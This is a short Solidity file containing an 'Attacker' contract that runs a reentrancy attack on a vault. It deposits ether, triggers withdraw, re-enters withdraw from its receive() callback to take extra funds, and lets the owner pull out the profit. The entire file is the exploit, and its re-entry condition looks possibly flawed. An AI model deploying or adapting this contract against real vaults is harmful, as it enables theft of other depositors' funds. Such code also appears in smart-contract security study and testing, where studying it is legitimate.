// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balances(address) external view returns (uint256);
}

contract Attacker {
    IVault public vault;
    address public owner;
    uint256 public initialDeposit;
    bool public hasDeposited;
    
    constructor(address _vault) {
        vault = IVault(_vault);
        owner = msg.sender;
    }
    
    function attack() external payable {
        require(msg.value >= 1 ether, "need 1 ether");
        initialDeposit = msg.value;
        
        // Step 1: Deposit
        vault.deposit{value: msg.value}();
        hasDeposited = true;
        
        // Step 2: Withdraw - triggers reentrancy
        vault.withdraw(msg.value);
    }
    
    // Reentrancy callback
    receive() external payable {
        if (hasDeposited && address(this).balance > initialDeposit) {
            // During reentrancy, try to withdraw more
            vault.withdraw(1 ether);
        }
    }
    
    function withdrawProfit() external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}